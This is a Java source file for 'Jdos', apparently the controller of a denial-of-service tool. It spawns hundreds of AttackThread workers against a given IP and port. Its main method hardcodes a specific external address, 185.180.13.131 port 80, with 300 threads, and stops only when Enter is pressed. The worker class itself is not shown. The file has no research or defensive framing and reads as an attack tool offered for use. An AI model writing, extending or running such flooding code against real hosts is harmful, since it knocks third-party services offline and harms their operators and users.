
import java.io.IOException;

/**
 *
 * @author filippofinke
 */
public class Jdos extends Thread {

    private String ip;

    private int port;

    private AttackThread[] threads;

    private boolean running = false;
    
    private int count;

    public boolean isRunning() {
        return running;
    }

    public Jdos(String ip, int port) {
        this(ip, port, 100, 100);
    }

    public Jdos(String ip, int port, int threads, int count) {
        this.ip = ip;
        this.port = port;
        this.threads = new AttackThread[threads];
        this.count = count;
    }

    @Override
    public void run() {
        System.out.println("Prepraing attack to " + ip + ":" + port + " with " + threads.length + " threads!");
        for (int i = 0; i < threads.length; i++) {
            threads[i] = new AttackThread(i, ip, port, count);
        }
        System.out.println("Starting threads...");
        for (AttackThread thread : threads) {
            thread.start();
        }
        System.out.println("Threads started!");
        running = true;
    }

    public void kill() {
        if (running) {
            for (AttackThread thread : threads) {
                if (thread != null) {
                    thread.interrupt();
                    System.out.println("Signal sent to " + thread.getId());
                }
            }
        }
    }

    public static void main(String[] args) throws InterruptedException, IOException {
        Count c = new Count();
        c.start();
        
        Jdos jdos = new Jdos("185.180.13.131", 80, 300, 500);
        jdos.start();
        jdos.join();
        
        System.out.println("Press enter to kill the attack");
        System.in.read();
        jdos.kill();
        c.interrupt();
        System.out.println("Bye");
    }

}
